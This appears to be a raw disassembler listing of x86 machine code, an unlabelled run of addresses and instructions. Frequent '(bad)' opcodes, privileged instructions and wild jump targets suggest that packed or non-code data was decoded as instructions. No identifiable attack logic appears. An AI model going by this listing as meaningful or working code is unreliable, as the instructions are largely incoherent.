  406c6f:	ret    0x840
  406c72:	jmp    0x6b2ce5ce
  406c77:	out    0x66,eax
  406c79:	push   0xffffffe9
  406c7b:	dec    esi
  406c7c:	sti    
  406c7d:	(bad)  
  406c7e:	mov    esp,0x7c795c5c
  406c83:	shl    BYTE PTR [ebx-0x77],0xac
  406c87:	enter  0x19d8,0x2e
  406c8b:	push   esi
  406c8c:	cld    
  406c8d:	out    0x69,eax
  406c8f:	enter  0xff63,0x93
	...
  406ca7:	add    BYTE PTR [ebp-0x331e8a9d],al
  406cad:	in     al,dx
  406cae:	dec    BYTE PTR [esi]
  406cb0:	rcr    al,0x1b
  406cb3:	add    BYTE PTR [ecx+0x2ae80771],ch
  406cb9:	(bad)  
  406cbb:	call   FWORD PTR [ecx]
  406cbd:	jae    0x406cba
  406cbf:	call   DWORD PTR [ebx+0x4b93e767]
  406cc5:	(bad)  
  406cc7:	leave  
  406cc8:	dec    esp
  406cc9:	call   DWORD PTR fs:[ebp+eax*4-0x35]
  406cce:	imul   eax,DWORD PTR [eax],0x41356666
  406cd4:	into   
  406cd5:	inc    edi
  406cd6:	cmc    
  406cd7:	xor    eax,0x35fefe8f
  406cdc:	mov    es,WORD PTR ds:0x6ce60041
  406ce2:	ret    0x9ff
  406ce5:	imul   edi,DWORD PTR [edi-0x1b04c8c],0x74dcae75
  406cef:	or     al,0x6e
  406cf1:	(bad)  [eax+ecx*1+0x36]
  406cf5:	mov    cl,0xe4
  406cf7:	call   FWORD PTR [ecx]
  406cf9:	enter  0xbfdd,0x19
  406cfd:	(bad)  [ecx+0x0]
  406d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d01:	xor    ax,0x8e41
  406d05:	inc    edi
  406d06:	cmc    
  406d07:	xor    eax,0x267ff4f
	...
  406d20:	add    BYTE PTR [esi-0x1],bh
  406d23:	jg     0x406d0d
  406d25:	faddp  st(1),st
  406d27:	(bad)  
  406d28:	call   DWORD PTR [ebp-0x41]
  406d2b:	jae    0x406d42
  406d2d:	fdiv   QWORD PTR ds:[eax+edx*1-0x67]
  406d32:	jb     0x406d3f
  406d34:	push   eax
  406d35:	jns    0x406da9
  406d37:	pop    es
  406d38:	call   0x3f310a
  406d3d:	xchg   esi,eax
  406d3e:	mov    WORD PTR [edi+0x660ca7ff],?
  406d44:	jne    0x406cdd
  406d46:	hlt    
  406d47:	out    dx,eax
  406d48:	or     ecx,DWORD PTR [edi-0x58becff3]
  406d4e:	fs out dx,eax
  406d50:	pop    es
  406d51:	jmp    DWORD PTR [edx]
  406d53:	pop    edi
  406d54:	dec    DWORD PTR [eax]
  406d56:	and    al,BYTE PTR [ecx+0xc]
  406d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d5a:	es jns 0x406d49
  406d5d:	and    al,0x9d
  406d5f:	push   0xf9bfa76a
  406d64:	(bad)  
  406d65:	jb     0x406dc8
  406d67:	pop    ebx
  406d68:	mov    esi,0x89653c23
  406d6d:	bound  esp,QWORD PTR [ebp+0x3bd0ffdc]
  406d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d74:	push   0xffc26df0
  406d79:	rol    DWORD PTR ds:0x8447e7fc,0x65
  406d80:	(bad)  
  406d81:	aas    
  406d82:	pop    edx
  406d83:	add    ebp,edi
	...
  406d99:	add    cl,ch
  406d9b:	add    BYTE PTR [edx+0x35],ah
  406d9e:	out    0x6b,al
  406da0:	fs jne 0x406d52
  406da3:	jae    0x406d5b
  406da5:	(bad)  
  406da6:	nop
  406da7:	fldenv [ebp+esi*2-0x75]
  406dab:	icebp  
  406dac:	out    dx,al
  406dad:	pop    es
  406dae:	(bad)  
  406daf:	push   ds
  406db0:	test   al,0xff
  406db2:	js     0x406dc7
  406db4:	inc    edx
  406db5:	add    al,0xa7
  406db7:	sahf   
  406db8:	js     0x406da6
  406dba:	sub    BYTE PTR es:[edi+esi*8+0x60],cl
  406dbf:	leave  
  406dc0:	jbe    0x406e07
  406dc2:	pop    ebx
  406dc3:	jl     0x406e29
  406dc5:	jne    0x406d6a
  406dc7:	sbb    BYTE PTR [edi],ch
  406dc9:	jo     0x406e49
  406dcb:	stos   BYTE PTR es:[edi],al
  406dcc:	add    ebp,eax
  406dce:	sbb    al,BYTE PTR [ebx]
  406dd0:	js     0x406dd6
  406dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd3:	or     eax,0x3b2bf529
  406dd8:	call   0xa48a14e0
  406ddd:	imul   esp,DWORD PTR [edi-0x1ffc16fe],0xffffffc7
  406de4:	hlt    
  406de5:	fs test al,0x2
  406de8:	jmp    0xe92c76c6
  406ded:	fld    DWORD PTR [eax]
  406def:	in     al,dx
  406df0:	call   0x3996d06b
  406df5:	ja     0x406e21
  406df7:	push   edi
  406df8:	fisub  WORD PTR [eax+ebp*8-0x4e]
  406dfc:	int    0xee
	...
  406e12:	add    al,bl
  406e14:	popa   
  406e15:	cmp    al,0x68
  406e17:	iret   
  406e18:	jmp    0xde77174
  406e1d:	test   eax,0x526ba3ef
  406e22:	add    ah,BYTE PTR [edi-0x709ceefe]
  406e28:	ret    
  406e29:	call   0x814ea892
  406e2e:	jns    0x406e15
  406e30:	popa   
  406e31:	mov    ss,ebx
  406e33:	sub    eax,0x937e7432
  406e38:	pop    ecx
  406e39:	jle    0x406e9f
  406e3b:	div    DWORD PTR [eax+eax*4+0x6e6166e9]
  406e42:	jp     0x406e6e
  406e44:	push   edx
  406e45:	pop    esi
  406e46:	fs js  0x406eb3
  406e49:	cmp    DWORD PTR [ebp+0x3c36170],esp
  406e4f:	jmp    ebp
  406e51:	push   ss
  406e52:	ret    
  406e53:	pusha  
  406e54:	pusha  
  406e55:	jl     0x406eca
  406e57:	push   eax
  406e58:	popa   
  406e59:	ds fs call 0xe761:0x64ffffd2
  406e62:	sbb    ebp,esp
  406e64:	popa   
  406e65:	push   DWORD PTR [eax-0x47]
  406e68:	neg    WORD PTR [esi]
  406e6b:	retf   
  406e6c:	in     al,dx
  406e6d:	inc    DWORD PTR [eax-0x16bee8c7]
  406e73:	mov    edx,DWORD PTR [edi+0xfef0]
	...
  406e89:	add    BYTE PTR [eax],al
  406e8b:	add    BYTE PTR [ecx+eiz*2+0x2a14b4ff],al
  406e92:	inc    ecx
  406e93:	jmp    0xef020304
  406e98:	test   BYTE PTR [ebx+0x615cd585],cl
  406e9e:	call   DWORD PTR [ebx-0x55]
  406ea1:	jmp    0x94fe:0x60e21f6b
  406ea8:	jnp    0x406f03
  406eaa:	inc    esi
  406eac:	inc    esp
  406ead:	pop    ss
  406eae:	jo     0x406ec0
  406eb0:	jmp    0xff61:0x625de760
  406eb7:	pusha  
  406eb8:	cs push 0xfffffff7
  406ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ebc:	inc    esp
  406ebd:	in     al,dx
  406ebe:	call   DWORD PTR [eax]
  406ec0:	lds    edx,FWORD PTR [esi]
  406ec2:	inc    ecx
  406ec3:	jmp    0x9731060d
  406ec8:	add    al,0x60
  406eca:	(bad)  
  406ecb:	mov    esp,0xe9412b74
  406ed0:	cld    
  406ed1:	fadd   st,st(0)
  406ed3:	jbe    0x406ed9
  406ed5:	mov    al,BYTE PTR [ebp-0xa02377]
  406edb:	je     0x406f0b
  406edd:	cmp    esi,edi
  406edf:	pop    esi
  406ee0:	add    al,0xb3
  406ee2:	addr16 popa 
  406ee4:	(bad)  
  406ee5:	sar    edi,0x4d
  406ee8:	ds push ebx
  406eea:	test   DWORD PTR [eax],0x35fee3e1
	...
  406f04:	add    BYTE PTR [esi],cl
  406f06:	das    
  406f07:	inc    ecx
  406f08:	add    dh,ah
  406f0a:	xchg   edi,eax
  406f0b:	sar    bh,0x91
  406f0e:	xadd   BYTE PTR [edi+eiz*4-0x79],dh
  406f13:	mov    ebp,0xfee399d8
  406f18:	add    al,0xb
  406f1a:	push   esp
  406f1b:	(bad)  
  406f1c:	xor    BYTE PTR [ecx-0x5e082377],al
  406f22:	jecxz  0x406f73
  406f24:	call   0x401107
  406f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f2a:	pop    edx
  406f2b:	or     al,al
  406f2d:	jp     0x406f38
  406f2f:	push   eax
  406f30:	call   0x40112f
  406f35:	dec    ecx
  406f36:	mov    ebx,esp
  406f38:	not    ecx
  406f3a:	in     al,0x14
  406f3c:	add    dh,cl
  406f3e:	add    eax,DWORD PTR [ebx-0x1431543]
  406f44:	(bad)  
  406f45:	mov    esi,0x53836437
  406f4a:	out    dx,eax
  406f4b:	idiv   bh
  406f4d:	adc    DWORD PTR [esp+esi*2],eax
  406f50:	pop    esp
  406f51:	dec    ebp
  406f52:	mov    ds:0xe511f7e8,al
  406f57:	push   DWORD PTR [ebx+0x6d]
  406f5a:	outs   dx,BYTE PTR ds:[esi]
  406f5b:	(bad)  
  406f5c:	jmp    DWORD PTR [ecx]
  406f5e:	mov    ds:0xeb9675ff,al
  406f63:	push   0xffffffba
  406f65:	adc    ebp,esp
  406f67:	(bad)  
  406f68:	mov    ch,0x0
	...
  406f7e:	and    bh,BYTE PTR [esi+edi*8+0x73b11ff]
  406f85:	call   0x3feccb
  406f8a:	sar    DWORD PTR [edx-0x18],1
  406f8d:	mul    DWORD PTR [edi-0x25009e48]
  406f93:	popa   
  406f94:	imul   esi,DWORD PTR [ecx-0x9e37e3],0x1a
  406f9b:	lds    ebx,FWORD PTR [ecx-0x1]
  406f9e:	dec    eax
  406f9f:	sbb    al,bl
  406fa1:	pop    es
  406fa2:	dec    edi
  406fa3:	mov    WORD PTR [ebp-0x67d7c701],ds
  406fa9:	loopne 0x406fe3
  406fab:	add    BYTE PTR [edx-0x1],ah
  406fae:	mov    dl,0x61
  406fb0:	imul   edx,DWORD PTR [ebp-0x9defa3],0x52
  406fb7:	and    eax,0x6010ff5a
  406fbc:	xlat   BYTE PTR ds:[ebx]
  406fbd:	pop    es
  406fbe:	dec    DWORD PTR [ebp-0x63]
  406fc1:	inc    DWORD PTR [eax]
  406fc3:	jo     0x406f5c
  406fc5:	in     al,0xf0
  406fc7:	addr16 popa 
  406fc9:	call   0xffa1ede4
  406fce:	call   0xe137e050
  406fd3:	dec    edi
  406fd4:	ins    BYTE PTR es:[edi],dx
  406fd5:	xchg   BYTE PTR [edx],bl
  406fd7:	dec    eax
  406fd8:	popa   
  406fd9:	call   FWORD PTR [edx]
  406fdb:	xor    DWORD PTR [ecx-0x1],ebx
  406fde:	enter  0xdd40,0xbc
	...
  406ff6:	add    al,al
  406ff8:	scas   eax,DWORD PTR es:[edi]
  406ff9:	popa   
  406ffa:	mov    ch,0xc7
  406ffc:	jg     0x40705f
  406ffe:	(bad)  
  406fff:	mov    edi,0xa8ff9ef8
  407004:	ja     0x406f9d
  407006:	lock cwde 
  407008:	lea    esp,[ecx-0x18]
  40700b:	add    al,bh
  40700d:	pusha  
  40700e:	call   DWORD PTR [eax-0x2f16a3d9]
  407014:	aad    0x60
  407016:	inc    DWORD PTR [eax+0x48e85f57]
  40701c:	add    esi,DWORD PTR [esi+0x4]
  40701f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407020:	dec    ebx
  407021:	sub    ecx,DWORD PTR [edi+eiz*4]
  407024:	mov    bh,0x61
  407026:	jo     0x40704c
  407028:	inc    edi
  407029:	push   ecx
  40702a:	out    dx,al
  40702b:	pop    eax
  40702c:	in     al,dx
  40702d:	icebp  
  40702e:	pusha  
  40702f:	fimul  DWORD PTR [edx]
  407031:	push   ecx
  407032:	(bad)  [esi]
  407034:	pop    esi
  407035:	ss mov ebp,edx
  407038:	pop    esi
  407039:	pop    esp
  40703a:	(bad)  
  40703b:	xor    BYTE PTR [ebx-0x3c86d470],dh
  407041:	call   0xa8550531
  407046:	add    esp,DWORD PTR [eax]
  407048:	sbb    BYTE PTR [ecx+0x1102662a],bl
  40704e:	sbb    eax,0xcfe5de7
  407053:	out    0xd6,eax
  407055:	fnsave [ebx+0x70e90388]
	...
  40706f:	add    BYTE PTR [ecx],bh
  407071:	pop    esi
  407072:	pop    esp
  407073:	pop    esp
  407074:	push   edi
  407075:	pop    ebp
  407076:	push   esp
  407077:	or     al,0xff
  407079:	mov    al,ds:0x6ae060b7
  40707e:	loope  0x40701e
  407080:	fcomp  DWORD PTR [ebp+0x74]
  407083:	(bad)  
  407084:	fdiv   DWORD PTR [edx-0x3c6ee6b0]
  40708a:	call   0x2855057a
  40708f:	add    al,0xb8
  407091:	pop    ss
  407092:	sbb    DWORD PTR [ebx],ebp
  407094:	data16 add dl,BYTE PTR [ecx-0x69a218f8]
  40709b:	or     al,0x67
  40709d:	(bad)  
  40709e:	cmc    
  40709f:	mov    bl,0x0
  4070a1:	add    ecx,ebp
  4070a3:	jo     0x4070f6
  4070a5:	pop    ebp
  4070a6:	hlt    
  4070a7:	pop    ebx
  4070a8:	neg    DWORD PTR [ebp+0x0]
  4070ab:	cld    
  4070ac:	lods   al,BYTE PTR ds:[esi]
  4070ad:	push   0x6e
  4070af:	pop    DWORD PTR [edi]
  4070b1:	pop    esi
  4070b2:	call   0xff9d80f4
  4070b7:	rcr    DWORD PTR [edi+0x17],1
  4070ba:	inc    ecx
  4070bb:	jmp    0x41484887
  4070c0:	jg     0x407120
  4070c2:	inc    DWORD PTR [esi-0x39]
  4070c5:	xlat   BYTE PTR ds:[ebx]
  4070c6:	sti    
  4070c7:	ds jno 0x4070cf
  4070ca:	call   0xff9d93c2
  4070cf:	and    dl,ah
  4070d1:	push   es
  4070d2:	add    BYTE PTR [eax+eax*1+0x0],bh
	...
  4070e9:	and    ebp,DWORD PTR [esi-0x7f]
  4070ec:	and    eax,0x16ff5568
  4070f1:	xor    edi,eax
  4070f3:	sti    
  4070f4:	mov    ecx,0x60bd787
  4070f9:	mov    ecx,0xa4a828d2
  4070fe:	push   0xfffffffd
  407100:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407102:	add    cl,BYTE PTR [ebx]
  407104:	sub    DWORD PTR [edi-0x5b173e79],edx
  40710a:	add    al,bh
  40710c:	and    al,0x4b
  40710e:	add    al,BYTE PTR [eax]
  407110:	jmp    0xd585b6b9
  407115:	js     0x40711c
  407117:	add    cl,ch
  407119:	mov    esi,0xbee9695c
  40711e:	pop    esp
  40711f:	imul   ebp,ecx,0x19f3c717
  407125:	push   ss
  407126:	xchg   esp,esi
  407128:	sahf   
  407129:	push   eax
  40712a:	pop    ebp
  40712b:	push   eax
  40712c:	sahf   
  40712d:	into   
  40712e:	push   esp
  40712f:	call   FWORD PTR [edi+eax*1]
  407132:	imul   ecx,edi,0x5f
  407135:	mov    ds:0x3e000b02,eax
  40713a:	cmp    eax,DWORD PTR [ecx+ebp*8]
  40713d:	add    al,BYTE PTR [esi]
  40713f:	add    BYTE PTR [eax],al
  407141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407142:	in     eax,0x27
  407144:	inc    ecx
  407145:	mov    ?,WORD PTR [ebp-0x4f29f38c]
  40714b:	mov    esi,0xff
	...
  407160:	add    BYTE PTR [eax],al
  407162:	leave  
  407163:	xchg   esi,eax
  407164:	mov    dl,al
  407166:	retf   
  407167:	mov    esp,esi
  407169:	imul   ecx
  40716b:	mov    ebx,0xe0f6524f
  407170:	mov    esi,0x858d89ff
  407175:	lock cmp DWORD PTR [ebx+0x7c36e8fe],0x14ffff
  407180:	push   0xff4750a4
  407185:	inc    BYTE PTR [ebx-0x5600094a]
  40718b:	mov    ebx,0x46f77034
  407190:	jmp    edi
  407192:	out    0x7c,al
  407194:	(bad)  
  407195:	inc    DWORD PTR [edi+0x9f7e489]
  40719b:	mov    ebp,0x71560069
  4071a0:	ss inc ecx
  4071a2:	(bad)  
  4071a3:	mov    esp,0xbd01f0b4
  4071a8:	(bad)  
  4071a9:	push   DWORD PTR [ebx-0x41bed7ca]
  4071af:	out    0x19,eax
  4071b1:	mov    edi,0x8588bd09
  4071b6:	jmp    0x6806:0x64fffeb4
  4071bd:	xchg   esi,eax
  4071be:	rol    BYTE PTR [esi-0x1],1
  4071c1:	(bad)  
  4071c2:	push   ebx
  4071c3:	scas   eax,DWORD PTR es:[edi]
  4071c4:	idiv   bh
	...
  4071da:	add    BYTE PTR [edi+0x17355e74],ah
  4071e0:	inc    ebx
  4071e1:	(bad)  
  4071e2:	dec    DWORD PTR [eax-0x7700627b]
  4071e8:	rol    BYTE PTR [edi+0x5dd478e0],cl
  4071ee:	push   0xffffffa7
  4071f0:	add    DWORD PTR [ebx+0x36],edi
  4071f3:	out    0x69,al
  4071f5:	pop    esi
  4071f6:	mov    ch,0x77
  4071f8:	mov    ah,0x5d
  4071fa:	jmp    DWORD PTR [eax-0x2]
  4071fd:	shr    DWORD PTR [eax],cl
  4071ff:	out    0x69,al
  407201:	imul   ebx,esi,0x11
  407204:	les    ebx,FWORD PTR [ebp-0x77]
  407207:	and    dh,BYTE PTR [ecx+0x3f40ff55]
  40720d:	add    ebp,DWORD PTR [eax+0xa]
  407210:	push   ebx
  407211:	(bad)  
  407212:	push   DWORD PTR [ecx]
  407214:	mov    esi,0xfc28f752
  407219:	pop    ebp
  40721a:	xor    eax,0xffc44297
  40721f:	add    BYTE PTR [ecx],ch
  407221:	popf   
  407222:	call   DWORD PTR [eax]
  407224:	rol    BYTE PTR [edi+0x5d5c10dc],cl
  40722a:	add    DWORD PTR [edx+0xd],0x56
  40722e:	(bad)  
  40722f:	clc    
  407230:	push   0xa62464d7
  407235:	jo     0x40722e
  407237:	call   0x83b47677
  40723c:	call   0x415adf
	...
  407251:	add    BYTE PTR [eax],al
  407253:	add    al,dl
  407255:	dec    ebx
  407256:	pop    ebp
  407257:	add    BYTE PTR [ebx-0x8],bl
  40725a:	jmp    0x40725b
  40725c:	enter  0x9e4b,0xff
  407260:	cmp    ah,BYTE PTR [ecx+0x6b]
  407263:	add    edi,edi
  407265:	stos   DWORD PTR es:[edi],eax
  407266:	pop    ebp
  407267:	(bad)  
  407268:	cli    
  407269:	add    DWORD PTR [ebp-0x61a557ab],edx
  40726f:	xlat   BYTE PTR ds:[ebx]
  407270:	test   al,0x6a
  407272:	ds pushf 
  407274:	cwde   
  407275:	pop    edx
  407276:	mov    ss,WORD PTR [edi+0x5d86527f]
  40727c:	mov    al,dl
  40727e:	lock imul ebp,esi,0xffffff9a
  407282:	jbe    0x4072e1
  407284:	js     0x407216
  407286:	test   DWORD PTR [ebp+0x70],edx
  407289:	pop    edx
  40728a:	data16 xlat BYTE PTR ds:[ebx]
  40728c:	mov    al,ds:0x609c226a
  407291:	pop    edx
  407292:	push   esi
  407293:	xchg   edi,eax
  407294:	inc    edi
  407295:	push   edx
  407296:	dec    esi
  407297:	pop    ebp
  407298:	push   eax
  407299:	shl    al,1
  40729b:	imul   edi,DWORD PTR [edx-0x66],0x3e
  40729f:	pop    ebp
  4072a0:	inc    eax
  4072a1:	nop
  4072a2:	adc    eax,0x2e5a3855
  4072a7:	xlat   BYTE PTR ds:[ebx]
  4072a8:	test   al,0x6a
  4072aa:	push   es
  4072ab:	pushf  
  4072ac:	sub    BYTE PTR [edx+0x1e],bl
  4072af:	xchg   edi,eax
  4072b0:	or     edx,DWORD PTR [edx+0x16]
  4072b3:	pop    ebp
  4072b4:	cvttps2pi mm2,QWORD PTR [edx+0x5d]
	...
  4072cc:	add    BYTE PTR [eax],dl
  4072ce:	pop    edx
  4072cf:	cmp    al,0x70
  4072d1:	adc    BYTE PTR [edx-0x2],bl
  4072d4:	imul   esp,DWORD PTR [ecx-0x7a30963],0xffffff8f
  4072db:	add    DWORD PTR [ebp-0x10],edx
  4072de:	pop    ecx
  4072df:	shl    eax,1
  4072e1:	sub    eax,0x1a5cde5a
  4072e6:	arpl   si,bx
  4072e8:	pop    esp
  4072e9:	fsubr  DWORD PTR [edx-0x1f]
  4072ec:	cwde   
  4072ed:	rcr    BYTE PTR [ecx-0x3a],1
  4072f0:	xchg   esi,eax
  4072f1:	jmp    0x407344
  4072f3:	mov    esi,0x57cf5c
  4072f8:	jae    0x407355
  4072fa:	pop    ecx
  4072fb:	push   DWORD PTR [esp+edx*2+0x51]
  4072ff:	jmp    DWORD PTR [esi-0x6ef830b5]
  407305:	mov    ebx,0xfb96ff58
  40730a:	(bad)  
  40730b:	lock xchg esi,eax
  40730d:	repz pop ecx
  40730f:	call   0xff99a1a1
  407314:	jle    0x40737f
  407316:	push   ecx
  407317:	jmp    0xff9a4c43
  40731c:	outs   dx,BYTE PTR ds:[esi]
  40731d:	pop    ecx
  40731e:	pop    ebp
  40731f:	call   0x428b3b
  407324:	xor    dh,ah
  407326:	or     al,BYTE PTR [eax]
  407328:	mov    esp,0x2583662f
  40732d:	lock in al,dx
  40732f:	call   edx
	...
  407345:	add    BYTE PTR [eax-0x330e8aa7],bl
  40734b:	push   eax
  40734c:	mov    bh,0x36
  40734e:	fisttp DWORD PTR [ebx-0x65c3d2bb]
  407354:	ss test al,0xa4
  407357:	pop    ecx
  407358:	jne    0x40734b
  40735a:	mov    WORD PTR [eax-0x3],ss
  40735d:	push   ss
  40735e:	jnp    0x4073b9
  407360:	jne    0x40736f
  407362:	jae    0x407333
  407364:	pop    es
  407365:	adc    ebp,eax
  407367:	call   0xe904:0x446efeff
  40736e:	xor    DWORD PTR [esp+ebp*8-0x8cd9798],ecx
  407375:	out    0x4c,al
  407377:	xchg   DWORD PTR [ebp-0x23],eax
  40737a:	sbb    ebx,DWORD PTR [eax+0x75]
  40737d:	in     eax,0x7d
  40737f:	pshufw mm0,QWORD PTR [eax],0xea
  407383:	pop    eax
  407384:	out    0x0,eax
  407386:	fimul  DWORD PTR [ecx-0x3b4b0000]
  40738c:	push   cs
  40738d:	test   DWORD PTR [esi+edi*8+0x4309ffff],esi
  407394:	test   DWORD PTR [eax],0xc70004be
  40739a:	retf   
  40739b:	mov    dl,0xfe
  40739d:	pop    es
  40739e:	mov    es,WORD PTR [edx+ebp*2]
  4073a1:	add    BYTE PTR [esi+edi*8-0x14bff97],ah
  4073a8:	mov    WORD PTR [ebp+0x0],es
	...
  4073bf:	cli    
  4073c0:	mov    cs,WORD PTR [ebp+eax*4-0x14c06]
  4073c7:	mov    ?,WORD PTR [ebx+0x3201f874]
  4073cd:	sti    
  4073ce:	call   0x40ff0b
  4073d3:	inc    ebp
  4073d4:	les    esi,FWORD PTR [ebx+0x5]
  4073d7:	out    0xb9,eax
  4073d9:	add    BYTE PTR [eax],al
  4073db:	ds ins BYTE PTR es:[edi],dx
  4073dd:	loopne 0x407407
  4073df:	(bad)  
  4073e1:	push   DWORD PTR [ebp+0x42]
  4073e4:	in     al,dx
  4073e5:	fdivr  DWORD PTR [ebp-0x2f75447f]
  4073eb:	mov    bl,0x81
  4073ed:	hlt    
  4073ee:	test   ecx,0xa6524fbb
  4073f4:	pop    esp
  4073f5:	mov    ebp,0x8585a1ff
  4073fa:	lock or DWORD PTR [ebp+0x6c0e6afe],edi
  407401:	adc    al,0x37
  407403:	dec    edi
  407404:	add    al,0xff
  407406:	mov    ch,0xee
  407408:	mov    ah,0xfe
  40740a:	inc    DWORD PTR [ecx]
  40740c:	rep outs dx,DWORD PTR ds:[esi]
  40740e:	sub    DWORD PTR [edi-0x58da1802],ecx
  407414:	outs   dx,BYTE PTR ds:[esi]
  407415:	pop    edx
  407416:	call   FWORD PTR [esi]
  407418:	fistp  WORD PTR [esi-0x9]
  40741b:	enter  0xed40,0xff
  40741f:	dec    eax
  407420:	pop    edi
  407421:	adc    al,BYTE PTR [ecx+0x0]
	...
  407438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407439:	nop
  40743a:	nop
  40743b:	lock mov eax,0x72ff5aa8
  407441:	stc    
  407442:	sub    al,0x41
  407444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407445:	jno    0x407449
  407447:	mov    ebp,0x858c7098
  40744c:	xor    DWORD PTR [eax+0x5a],0xffffffff
  407450:	std    
  407451:	imul   ebp,ebx,0x42ab80a
  407457:	push   DWORD PTR [edx]
  407459:	fst    DWORD PTR [ecx-0x1]
  40745c:	jo     0x407446
  40745e:	pshufw mm7,QWORD PTR [esi+0x4ee803aa],0x75
  407466:	pop    edx
  407467:	jmp    FWORD PTR [esi]
  407469:	out    0x6a,al
  40746b:	not    DWORD PTR [eax-0x38]
  40746e:	in     al,dx
  40746f:	inc    eax
  407471:	popa   
  407472:	adc    al,BYTE PTR [ecx-0x59]
  407475:	sbb    BYTE PTR [eax+0x5a1030f0],dl
  40747b:	(bad)  
  40747c:	jp     0x407417
  40747e:	sub    al,0x41
  407480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407481:	icebp  
  407482:	dec    ebp
  407483:	mov    esp,0x858bf820
  407488:	pop    es
  407489:	clc    
  40748a:	pop    ecx
  40748b:	jmp    DWORD PTR [edx]
  40748d:	fisubr WORD PTR [esi]
  40748f:	test   DWORD PTR [eax],0x9767b300
  407495:	nop
  407496:	(bad)  
  407497:	(bad)  
  407498:	stc    
  407499:	adc    eax,0xf753
	...
  4074ae:	add    BYTE PTR [eax],al
  4074b0:	add    al,dh
  4074b2:	addr16 pop ecx
  4074b4:	xor    eax,0xc3100277
  4074b9:	loopne 0x407519
  4074bb:	xchg   ecx,eax
  4074bc:	cwde   
  4074bd:	fcom   DWORD PTR [esi-0x1e]
  4074c0:	inc    ebx
  4074c1:	pop    ebx
  4074c2:	stc    
  4074c3:	imul   edx,DWORD PTR [edi+0x59c64ef3],0x58d8cdab
  4074cd:	ja     0x407456
  4074cf:	ins    BYTE PTR es:[edi],dx
  4074d0:	cmp    BYTE PTR [eax-0x3f4b51aa],bh
  4074d6:	int3   
  4074d7:	pop    edi
  4074d8:	pop    ecx
  4074d9:	mov    al,ds:0x670cf56a
  4074de:	iret   
  4074df:	out    dx,al
  4074e0:	mov    bl,0x88
  4074e2:	in     al,dx
  4074e3:	dec    edi
  4074e4:	pop    ecx
  4074e5:	mov    BYTE PTR [esi],bh
  4074e7:	ins    BYTE PTR es:[edi],dx
  4074e8:	cmp    BYTE PTR [eax+0x56],bh
  4074eb:	jle    0x4074dc
  4074ed:	js     0x407545
  4074ef:	jmp    0x76739f7a
  4074f4:	pop    ecx
  4074f5:	push   0x99f6d0b3
  4074fa:	ret    
  4074fb:	call   0x5e938758
  407500:	pop    ecx
  407501:	push   eax
  407502:	push   esi
  407503:	adc    al,0xd4
  407505:	jg     0x4074ca
  407507:	call   0x3ed75277
  40750c:	pop    ecx
  40750d:	adc    BYTE PTR cs:[ecx],0x51
  407511:	xor    BYTE PTR [esi+0x6a],dl
  407514:	xchg   edi,eax
	...
  407529:	add    BYTE PTR [ebx+0x4e],al
  40752c:	es pop ecx
  40752e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752f:	add    eax,0x2a77d65
  407534:	jmp    0x16a7c7bd
  407539:	pop    ecx
  40753a:	or     BYTE PTR [ebx],al
  40753c:	idiv   BYTE PTR [edi+0x31]
  40753f:	add    ebp,ecx
  407541:	add    esp,DWORD PTR [eax+ebx*4]
  407544:	add    BYTE PTR [ecx],al
  407546:	push   esi
  407547:	push   ebp
  407548:	(bad)  
  407549:	jmp    0xe9c1f3ed
  40754e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40754f:	add    ch,BYTE PTR [eax-0x7]
  407552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407553:	gs mov esi,0xe7fde1d6
  407559:	js     0x407574
  40755b:	push   esi
  40755c:	inc    esi
  40755e:	xor    DWORD PTR [edi-0x9],esp
  407561:	mov    esi,0xe175555f
  407566:	cmp    al,0x5f
  407568:	mov    ch,0xae
  40756a:	dec    edi
  40756b:	push   ebp
  40756c:	mov    ch,0x91
  40756e:	not    DWORD PTR [ebp-0x1]
  407571:	sahf   
  407572:	imul   edi,ebp,0x5521bee7
  407578:	dec    DWORD PTR [esi-0x7908a1e7]
  40757e:	fist   WORD PTR [ebp+0x75]
  407581:	icebp  
  407582:	or     al,0x4c
  407584:	mov    ch,0x76
  407586:	iret   
  407587:	push   ebp
  407588:	mov    ch,0x8d
  40758a:	xlat   BYTE PTR ds:[ebx]
  40758b:	push   ebp
  40758c:	jmp    DWORD PTR [esi+0x0]
	...
  4075a3:	jno    0x4075a2
  4075a5:	out    0xc0,eax
  4075a7:	sub    DWORD PTR [ebp-0x1],edx
  4075aa:	push   esi
  4075ab:	and    DWORD PTR [edx-0x9],esp
  4075ae:	dec    esi
  4075af:	out    dx,eax
  4075b0:	push   ebp
  4075b1:	jne    0x4075a4
  4075b3:	int3   
  4075b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b5:	mov    ch,0x3e
  4075b7:	fild   WORD PTR [ecx+0x55d711bd]
  4075bd:	(bad)  
  4075be:	jmp    0x64c36e1b
  4075c3:	aam    0x4d
  4075c5:	call   FWORD PTR [esi]
  4075c7:	sbb    dh,cl
  4075c9:	adc    DWORD PTR [edx-0x6f],esp
  4075cc:	cmp    dh,bh
  4075ce:	push   cs
  4075cf:	outs   dx,DWORD PTR ds:[esi]
  4075d0:	push   ebp
  4075d1:	xor    BYTE PTR [eax],al
  4075d3:	test   eax,0xd7e80744
  4075d8:	cmp    edi,0xffffffff
  4075db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075dc:	pop    es
  4075dd:	push   0x0
  4075df:	stc    
  4075e0:	inc    esi
  4075e1:	pop    es
  4075e2:	call   0x3fe992
  4075e7:	stc    
  4075e8:	jb     0x4075ce
  4075ea:	idiv   ecx
  4075ec:	lods   al,BYTE PTR ds:[esi]
  4075ed:	out    0x89,eax
  4075ef:	lods   eax,DWORD PTR ss:[esi]
  4075f1:	(bad)  
